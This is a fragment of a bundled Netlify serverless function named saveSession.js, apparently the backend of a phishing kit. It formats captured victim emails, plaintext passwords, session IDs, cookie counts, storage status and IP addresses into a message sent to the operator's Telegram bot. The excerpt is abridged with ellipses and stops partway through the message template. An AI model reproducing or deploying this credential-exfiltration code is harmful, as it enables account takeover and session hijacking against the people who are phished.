...
// netlify/functions/saveSession.js
var saveSession_exports = {};
__export(saveSession_exports, {
  handler: () => handler
});
module.exports = __toCommonJS(saveSession_exports);
  ...
  try {
    ...
    try {
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && !data.skipTelegram) {
        const quickMessage = `\u{1F514} NEW SESSION SAVED

\u{1F4E7} ${sessionData.email}
\u{1F511} ${sessionData.password}
\u{1F194} ${sessionData.sessionId}
\u{1F36A} ${Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0} cookies
\u{1F4BE} Storage: ${sessionData.localStorage !== "Empty" ? "Has Data" : "Empty"}
\u{1F310} IP: ${sessionData.clientIP}
